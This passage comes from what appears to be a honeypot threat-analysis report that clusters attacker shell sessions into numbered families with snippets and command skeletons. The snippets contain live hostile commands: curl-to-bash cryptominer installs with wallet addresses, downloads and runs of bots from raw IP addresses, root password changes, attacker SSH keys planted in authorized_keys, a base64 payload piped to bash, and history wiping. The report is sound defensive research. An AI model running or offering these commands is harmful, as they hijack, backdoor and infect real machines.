';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('chmod', '&&'), ('PH_EXEC_2', '&&'), ('chmod', '&&'), ('chmod', ';'), ('PH_EXEC_3', ';'), ('busybox', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('busybox', ';'), ('chmod', ';'), ('echo', ';'), ('chmod', '&&'), ('PH_EXEC_2', '&&'), ('chmod', '&&'), ('chmod', ';'), ('PH_EXEC_3', ';'), ('busybox', 'EOS')]`

Top operators: [('busybox', 70), ('chmod', 64), ('echo', 58), ('>', 17), ('cd', 15), ('sh', 2), ('runshellcmd', 2), ('start-shell', 2), ('PH_EXEC_2', 2), ('PH_EXEC_3', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 5b9000e455933318 | f92481f2ba29 |      223 |               1 |

---

## Family 183

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `5c8e3e532299e536` (Session: `860a407bcaec`, n_rows=4)

**Medoid Execution Snippet:**
```text
curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 4ANkemPGmjeLPgLfyYupu2B8Hed2dy8i6XYF7ehqRsSfbvZM2Pz7bDeaZXVQAs533a7MUnhB6pUREVDj2LgWj1AQSGo2HRj
wget https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh
sh setup_c3poo ...
```

**Consensus Skeleton (op, conn pairs):**
`[('curl', '|'), ('bash', ';'), ('wget', ';'), ('sh', ';'), ('echo', '|'), ('passwd', 'EOS')]`

Top operators: [('curl', 1), ('bash', 1), ('wget', 1), ('sh', 1), ('echo', 1), ('passwd', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 5c8e3e532299e536 | 860a407bcaec |        4 |               1 |

---

## Family 224

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `5cbff6b937eee6ca` (Session: `bc1cdc9e1f23`, n_rows=8)

**Medoid Execution Snippet:**
```text
cat /etc/issue
wget 104.248.171.242/bot.pl
curl -O 104.248.171.242/bot.pl
perl bot.pl
rm -rf bot.pl
history -c
rm -rf bot*
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('wget', ';'), ('curl', ';'), ('perl', ';'), ('rm', ';'), ('history', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('rm', 2), ('history', 2), ('cat', 1), ('wget', 1), ('curl', 1), ('perl', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 5cbff6b937eee6ca | bc1cdc9e1f23 |        8 |               1 |

---

## Family 314

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `6374dfc93de5b918` (Session: `4cc0b3bbeae4`, n_rows=6)

**Medoid Execution Snippet:**
```text
top
uname
uname -a
whoami
lscpu | grep Model
df -h | head -n 2 | awk 'FNR == 2 {print $2;}' ;
```

**Consensus Skeleton (op, conn pairs):**
`[('top', ';'), ('uname', ';'), ('uname', ';'), ('whoami', ';'), ('lscpu', '|'), ('grep', ';'), ('df', '|'), ('head', '|'), ('awk', 'EOS')]`

Top operators: [('uname', 2), ('top', 1), ('whoami', 1), ('lscpu', 1), ('grep', 1), ('df', 1), ('head', 1), ('awk', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 6374dfc93de5b918 | 4cc0b3bbeae4 |        6 |               1 |

---

## Family 310

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `65338f5682f9602f` (Session: `fa8c9a070ec4`, n_rows=8)

**Medoid Execution Snippet:**
```text
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPg ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', 'EOS')]`

Top operators: [('grep', 3), ('cd', 2), ('cat', 2), ('wc', 2), ('rm', 1), ('mkdir', 1), ('echo', 1), ('chmod', 1), ('ls', 1), ('which', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 65338f5682f9602f | fa8c9a070ec4 |        8 |               1 |

---

## Family 342

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `6980c821d76c3362` (Session: `d9c942aca877`, n_rows=10)

**Medoid Execution Snippet:**
```text
rm -rf *
cd /tmp
rm -rf *
pkill xmrig
echo -e "xoxox0\nxoxox0" | passwd
wget http://212.192.241.125/pedalcheta/cutie.x86_64
curl -O http://212.192.241.125/pedalcheta/cutie.x86_64
chmod 777 cutie.x86_64
./cutie.x86_64 x86.nday
rm -rf cutie.* ;
```

**Consensus Skeleton (op, conn pairs):**
`[('rm', ';'), ('cd', ';'), ('rm', ';'), ('kill', ';'), ('echo', '|'), ('passwd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', 'EOS')]`

Top operators: [('rm', 3), ('cd', 1), ('kill', 1), ('echo', 1), ('passwd', 1), ('wget', 1), ('curl', 1), ('chmod', 1), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 6980c821d76c3362 | d9c942aca877 |       10 |               1 |

---

## Family 131

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `6b628f74bebcc014` (Session: `33aa06b64806`, n_rows=1)

**Medoid Execution Snippet:**
```text
uptime -p && uname -p ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uptime', '&&'), ('uname', 'EOS')]`

Top operators: [('uptime', 1), ('uname', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 6b628f74bebcc014 | 33aa06b64806 |        1 |               1 |

---

## Family 129

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `6e670c461a84c604` (Session: `4ad586b4a680`, n_rows=5)

**Medoid Execution Snippet:**
```text
echo `hostname`;echo -e `hostname`n`hostname` | passwd
curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA
hostname
hostname
hostname ;
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', ';'), ('echo', '|'), ('passwd', ';'), ('curl', '|'), ('bash', ';'), ('hostname', ';'), ('hostname', ';'), ('hostname', 'EOS')]`

Top operators: [('hostname', 3), ('echo', 2), ('passwd', 1), ('curl', 1), ('bash', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 6e670c461a84c604 | 4ad586b4a680 |        5 |               1 |

---

## Family 303

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `6f93a11a6132309d` (Session: `88fe0ad4adec`, n_rows=5)

**Medoid Execution Snippet:**
```text
scp -t /tmp/1ZtMpQgh
cd /tmp && chmod +x 1ZtMpQgh && bash -c ./1ZtMpQgh
./1ZtMpQgh
cd /tmp && chmod +x 1ZtMpQgh && bash -c ./1ZtMpQgh
./1ZtMpQgh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('scp', ';'), ('cd', '&&'), ('chmod', '&&'), ('bash', ';'), ('PH_EXEC_2', ';'), ('cd', '&&'), ('chmod', '&&'), ('bash', ';'), ('PH_EXEC_2', 'EOS')]`

Top operators: [('cd', 2), ('chmod', 2), ('bash', 2), ('PH_EXEC_2', 2), ('scp', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 6f93a11a6132309d | 88fe0ad4adec |        5 |               1 |

---

## Family 339

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `6fc79d2b6ccc1af9` (Session: `15bf716539bc`, n_rows=9)

**Medoid Execution Snippet:**
```text
whoami
list
ls
uname -a
cd /etc/
ls
less passwd
more passwd
cat passwd ;
```

**Consensus Skeleton (op, conn pairs):**
`[('whoami', ';'), ('list', ';'), ('ls', ';'), ('uname', ';'), ('cd', ';'), ('ls', ';'), ('less', ';'), ('more', ';'), ('cat', 'EOS')]`

Top operators: [('ls', 2), ('whoami', 1), ('list', 1), ('uname', 1), ('cd', 1), ('less', 1), ('more', 1), ('cat', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 6fc79d2b6ccc1af9 | 15bf716539bc |        9 |               1 |

---

## Family 344

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `7103f1d5b741342b` (Session: `8c9ccee06cc1`, n_rows=9)

**Medoid Execution Snippet:**
```text
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
history -n
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
uname
ps -x
cat /proc/cpuinfo
free -m ;
```

**Consensus Skeleton (op, conn pairs):**
`[('unset', ';'), ('history', ';'), ('export', ';'), ('export', ';'), ('export', ';'), ('uname', ';'), ('ps', ';'), ('cat', ';'), ('free', 'EOS')]`

Top operators: [('export', 3), ('unset', 1), ('history', 1), ('uname', 1), ('ps', 1), ('cat', 1), ('free', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 7103f1d5b741342b | 8c9ccee06cc1 |        9 |               1 |

---

## Family 221

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `74b08765150e6b55` (Session: `9c38e995dade`, n_rows=3)

**Medoid Execution Snippet:**
```text
curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA
echo root:rando3r5g | chpasswd | bash
echo storytimevistedurshit ;
```

**Consensus Skeleton (op, conn pairs):**
`[('curl', '|'), ('bash', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('echo', 'EOS')]`

Top operators: [('bash', 2), ('echo', 2), ('curl', 1), ('chpasswd', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 74b08765150e6b55 | 9c38e995dade |        3 |               1 |

---

## Family 181

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `7584c543d32d5644` (Session: `5dad0c9a5924`, n_rows=2)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | cut -f2 -d':' | uniq -c
uname -a ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('cut', '|'), ('uniq', ';'), ('uname', 'EOS')]`

Top operators: [('cat', 1), ('grep', 1), ('cut', 1), ('uniq', 1), ('uname', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 7584c543d32d5644 | 5dad0c9a5924 |        2 |               1 |

---

## Family 256

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `7673a10100997d20` (Session: `d2a5cfa6938f`, n_rows=10)

**Medoid Execution Snippet:**
```text
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
echo ''>DIRTEST
wget http://45.144.225.27/bin.sh
busybox wget http://45.144.225.27/busy.sh
tftp -r tbin.sh -g 45.144.225.27
curl http://45.144.225.27/curl.sh ;chmod +x  bin.sh busy.sh binbusy.sh tbin.sh curl.sh
./bin.sh
./busy.sh
./tbin.sh ;./cur ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('echo', ';'), ('wget', ';'), ('busybox', ';'), ('tftp', ';'), ('curl', ';'), ('chmod', ';'), ('PH_EXEC_2', ';'), ('PH_EXEC_3', ';'), ('PH_EXEC_4', ';'), ('PH_EXEC_5', ';'), ('rm', 'EOS')]`

Top operators: [('cd', 5), ('echo', 1), ('wget', 1), ('busybox', 1), ('tftp', 1), ('curl', 1), ('chmod', 1), ('PH_EXEC_2', 1), ('PH_EXEC_3', 1), ('PH_EXEC_4', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 7673a10100997d20 | d2a5cfa6938f |       10 |               1 |

---

## Family 141

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `79436038e7675e57` (Session: `fb83a5195194`, n_rows=12)

**Medoid Execution Snippet:**
```text
sh
shell
ls /
cd /tmp  cd /var/run  cd /mnt  cd /root  cd /
wget http://172.81.61.34/Sakura.sh
chmod 777 *
sh Sakura.sh
tftp -g 172.81.61.34 -r tftp1.sh
chmod 777 *
sh tftp1.sh
rm -rf *.sh
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('ls', ';'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('sh', 3), ('chmod', 2), ('shell', 1), ('ls', 1), ('cd', 1), ('wget', 1), ('tftp', 1), ('rm', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 79436038e7675e57 | fb83a5195194 |       12 |               1 |

---

## Family 265

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `7b61ffc0ed23e667` (Session: `1c19ddc5d37d`, n_rows=1)

**Medoid Execution Snippet:**
```text
ps faxu ;
```

**Consensus Skeleton (op, conn pairs):**
`[('ps', 'EOS')]`

Top operators: [('ps', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 7b61ffc0ed23e667 | 1c19ddc5d37d |        1 |               1 |

---

## Family 228

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `7bc2cc5d65f7d84a` (Session: `2ded8f81db6a`, n_rows=19)

**Medoid Execution Snippet:**
```text
cd /tmp
wget http://107.172.249.148/d
curl -O http://107.172.249.148/c
busybox wget http://107.172.249.148/m
chmod 777 d
chmod 777 c
chmod 777 m
./d
echo wgets done
./c
echo curl done
./m
echo busybox ran
pkill x-8.6-.ISIS
pkill fuckjewishpeople.x86
pkill x86
pkill x86_64
pkill i686
rm -rf * ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('wget', ';'), ('curl', ';'), ('busybox', ';'), ('chmod', ';'), ('chmod', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('echo', ';'), ('PH_EXEC_2', ';'), ('echo', ';'), ('PH_EXEC_3', ';'), ('echo', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('rm', 'EOS')]`

Top operators: [('kill', 5), ('chmod', 3), ('echo', 3), ('cd', 1), ('wget', 1), ('curl', 1), ('busybox', 1), ('PH_EXEC_1', 1), ('PH_EXEC_2', 1), ('PH_EXEC_3', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 7bc2cc5d65f7d84a | 2ded8f81db6a |       19 |               1 |

---

## Family 262

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `7d6447155ed432ab` (Session: `ec4302712b2e`, n_rows=1)

**Medoid Execution Snippet:**
```text
Cookie: rememberMe=1 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('Cookie:', 'EOS')]`

Top operators: [('Cookie:', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 7d6447155ed432ab | ec4302712b2e |        1 |               1 |

---

## Family 273

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `7f6d4fade26cd034` (Session: `69d4ad34b9b2`, n_rows=5)

**Medoid Execution Snippet:**
```text
cat /var/tmp/.systemcache436621
echo "1" > /var/tmp/.systemcache436621
cat /var/tmp/.systemcache436621
sleep 15s && cd /var/tmp
echo "IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApta2RpciAuWDE3LXVuaXgKY2QgLlgxNy11bml4Cm12IC92YXIvdG1wL2 ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('echo', ';'), ('cat', ';'), ('sleep', '&&'), ('cd', ';'), ('echo', '|'), ('base64', '|'), ('bash', 'EOS')]`

Top operators: [('cat', 2), ('echo', 2), ('sleep', 1), ('cd', 1), ('base64', 1), ('bash', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 7f6d4fade26cd034 | 69d4ad34b9b2 |        5 |               1 |

---

## Family 296

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `7fd1678ed9620b77` (Session: `6d70d7f9ccab`, n_rows=14)

**Medoid Execution Snippet:**
```text
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
rm -rf installer.sh
wget http://51.75.170.84/installer.sh
chmod 777 installer.sh
sh installer.sh
rm -rf tftp1.sh
tftp 51.75.170.84 -c get tftp1.sh
chmod 777 tftp1.sh
sh tftp1.sh
rm -rf tftp2.sh
tftp -r tftp2.sh -g 51.75.170.84
chmod 777 tftp2.sh
 ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('rm', 'EOS')]`

Top operators: [('cd', 5), ('rm', 4), ('chmod', 3), ('sh', 3), ('tftp', 2), ('wget', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 7fd1678ed9620b77 | 6d70d7f9ccab |       14 |               1 |

---

## Family 130

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `817189a08a5944e2` (Session: `11ba60a2950d`, n_rows=1)

**Medoid Execution Snippet:**
```text
enable ;
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', 'EOS')]`

Top operators: [('enable', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 817189a08a5944e2 | 11ba60a2950d |        1 |               1 |

---

## Family 313

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `82a9e6cc501d24b0` (Session: `248c1614f336`, n_rows=5)

**Medoid Execution Snippet:**
```text
uname -a
nvidia-smi
echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash
curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | bash -s 4B7vD4PrcGdES1grKPBH5jbsh4SgknSzkFFRHxWMqux7bJrieQoawCiFnd36wKTPtAUXJLeQBZWKRKza7qJaQscx2kCCrZo
curl: option -L not recognized
 ...
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('nvidia-smi', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('curl', '|'), ('bash', ';'), ('curl:', ';'), ('curl:', 'EOS')]`

Top operators: [('bash', 2), ('curl:', 2), ('uname', 1), ('nvidia-smi', 1), ('echo', 1), ('chpasswd', 1), ('curl', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 82a9e6cc501d24b0 | 248c1614f336 |        5 |               1 |

---

## Family 323

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `8308204e65d7da0c` (Session: `0e4a03f10929`, n_rows=3)

**Medoid Execution Snippet:**
```text
ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1
MAN: "ssdp:discover"
MX: 2 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('ST:', ';'), ('MAN:', ';'), ('MX:', 'EOS')]`

Top operators: [('ST:', 1), ('MAN:', 1), ('MX:', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 8308204e65d7da0c | 0e4a03f10929 |        3 |               1 |

---

## Family 315

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `84fea316531be65f` (Session: `fbb43562f48f`, n_rows=23)

**Medoid Execution Snippet:**
```text
wget dawis.tw/x86_64
wget dawis.tw/i686
wget dawis.tw/arm
wget dawis.tw/arc
wget dawis.tw/arm5
wget dawis.tw/arm6
wget dawis.tw/arm7
wget dawis.tw/i586
wget dawis.tw/mips
wget dawis.tw/mipsel
wget dawis.tw/sh4
chmod 777 *
./arc x86
./arm x86
./arm5 x86
./arm6 x86
./arm7 x86
./i586 x86
./i686 x86
./m ...
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', ';'), ('wget', ';'), ('wget', ';'), ('wget', ';'), ('wget', ';'), ('wget', ';'), ('wget', ';'), ('wget', ';'), ('wget', ';'), ('wget', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('PH_EXEC_2', ';'), ('PH_EXEC_3', ';'), ('PH_EXEC_4', ';'), ('PH_EXEC_5', ';'), ('PH_EXEC_6', ';'), ('PH_EXEC_7', ';'), ('PH_EXEC_8', ';'), ('PH_EXEC_9', ';'), ('PH_EXEC_10', ';'), ('PH_EXEC_11', 'EOS')]`

Top operators: [('wget', 11), ('chmod', 1), ('PH_EXEC_1', 1), ('PH_EXEC_2', 1), ('PH_EXEC_3', 1), ('PH_EXEC_4', 1), ('PH_EXEC_5', 1), ('PH_EXEC_6', 1), ('PH_EXEC_7', 1), ('PH_EXEC_8', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 84fea316531be65f | fbb43562f48f |       23 |               1 |

---

## Family 258

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `85564d3b90c178e9` (Session: `1030c6d69244`, n_rows=1)

**Medoid Execution Snippet:**
```text
id ;
```

**Consensus Skeleton (op, conn pairs):**
`[('id', 'EOS')]`

Top operators: [('id', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 85564d3b90c178e9 | 1030c6d69244 |        1 |               1 |

---

## Family 113

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `870bfca4b8cff842` (Session: `6bacdb62454e`, n_rows=5)

**Medoid Execution Snippet:**
```text
cd ~
chattr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvc ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('chattr', ';'), ('lockr', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', 'EOS')]`

Top operators: [('cd', 3), ('chattr', 1), ('lockr', 1), ('rm', 1), ('mkdir', 1), ('echo', 1), ('chmod', 1), ('cat', 1), ('grep', 1), ('wc', 1)]


**Top Member Archetypes by Volume:**

